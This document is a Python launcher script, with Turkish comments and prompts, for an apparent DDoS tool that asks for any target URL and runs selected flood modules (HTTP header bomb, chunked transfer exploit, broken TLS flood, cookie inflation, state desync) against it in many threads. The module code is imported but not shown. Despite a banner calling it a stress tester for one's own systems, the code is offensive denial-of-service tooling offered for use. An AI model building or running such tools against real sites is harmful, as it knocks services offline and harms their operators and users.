# main.py

from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
from rich.table import Table
from rich import box
import threading

# Tüm saldırı modülleri
from modules import (
    header_bomb,
    chunked_transfer,
    broken_tls,
    cookie_inflation,
    state_desync
)

console = Console()

# Modül listesi: ID, (Açıklama, Fonksiyon)
attack_modules = {
    "1": ("HTTP Header Bombası", header_bomb.run),
    "2": ("Chunked Transfer Exploit", chunked_transfer.run),
    "3": ("Broken TLS Flood", broken_tls.run),
    "4": ("Cookie Inflation Flood", cookie_inflation.run),
    "5": ("State Desync Attack", state_desync.run),
}

def banner():
    console.print(Panel.fit("""
[bold magenta]imehmetech DDoS Tool BETA[/bold magenta]
[cyan]Modern Python Web Stres Test Aracı[/cyan]
[white]Sadece kendi sistemlerinizde kullanın![/white]
""", title="🔥 [green]Dikkatli Kullan[/green] 🔥", style="bold blue"))

def show_menu():
    table = Table(title="Saldırı Modülleri", box=box.ROUNDED, highlight=True)
    table.add_column("ID", style="cyan", justify="center")
    table.add_column("Açıklama", style="green")

    for key, (name, _) in attack_modules.items():
        table.add_row(key, name)

    console.print(table)

def get_selections():
    selection = Prompt.ask("Seçmek istediğiniz modüllerin ID'lerini virgülle ayırarak yaz (örnek: 1,3,5)")
    selected_ids = [s.strip() for s in selection.split(",")]
    return [attack_modules[i] for i in selected_ids if i in attack_modules]

def main():
    banner()
    show_menu()

    target = Prompt.ask("[bold yellow]Hedef URL[/bold yellow] (örn: http://127.0.0.1)")
    threads = int(Prompt.ask("Thread sayısı", default="50"))
    reqs = int(Prompt.ask("Thread başına istek", default="100"))

    selected_attacks = get_selections()
    if not selected_attacks:
        console.print("[bold red]Hiçbir geçerli modül seçilmedi.[/bold red]")
        return

    console.print(f"\n[bold green]Seçilen saldırılar:[/bold green] {[name for name, _ in selected_attacks]}")
    console.print(f"[bold magenta]Hedef:[/bold magenta] {target}  |  [bold cyan]Thread:[/bold cyan] {threads}  |  [bold cyan]İstek/thread:[/bold cyan] {reqs}\n")

    threads_list = []

    for name, attack_func in selected_attacks:
        t = threading.Thread(target=attack_func, args=(target, threads, reqs))
        t.start()
        threads_list.append(t)

    for t in threads_list:
        t.join()

    console.print("\n[bold green]✔ Tüm saldırılar tamamlandı.[/bold green]")

if __name__ == "__main__":
    main()
